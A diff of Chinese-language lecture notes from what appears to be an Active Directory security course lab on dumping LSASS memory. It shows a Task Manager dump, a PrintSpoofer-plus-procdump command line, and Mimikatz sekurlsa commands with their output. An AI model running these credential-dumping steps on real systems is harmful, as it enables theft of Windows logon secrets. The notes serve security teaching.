@@ -16,16 +16,15 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
 有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?
 
 ## Lab
-
-### ==Take LSASS with other ways==
-
+### Take LSASS with other ways
 #### 方法一
-在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
+在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選**建立傾印檔案**，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
 ![](https://hackmd.io/_uploads/ryINQ7NRh.png)
 ![](https://hackmd.io/_uploads/ByvHX7NR2.png)
 
 #### 方法二
 如果沒有GUI的話，也可以考慮直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
+
 Command: `c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"`
 ![](https://hackmd.io/_uploads/HJXt8mN0h.png)
 可以看到它放在`C:\Windows\system32\lsass.dmp`中
@@ -36,7 +35,7 @@ Command: `c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tool
 $ Sekurlsa::minidump "<path to lsass.dmp>"
 $ Sekurlsa::logonPasswords
 ```
-:::spoiler Result
+
 ```bash
 mimikatz # Sekurlsa::minidump "C:\Windows\system32\lsass.dmp"
 Switch to MINIDUMP : 'C:\Windows\system32\lsass.dmp'
@@ -364,6 +363,3 @@ SID               : S-1-5-18
         credman :
         cloudap :
 ```
-:::
-
-## Reference
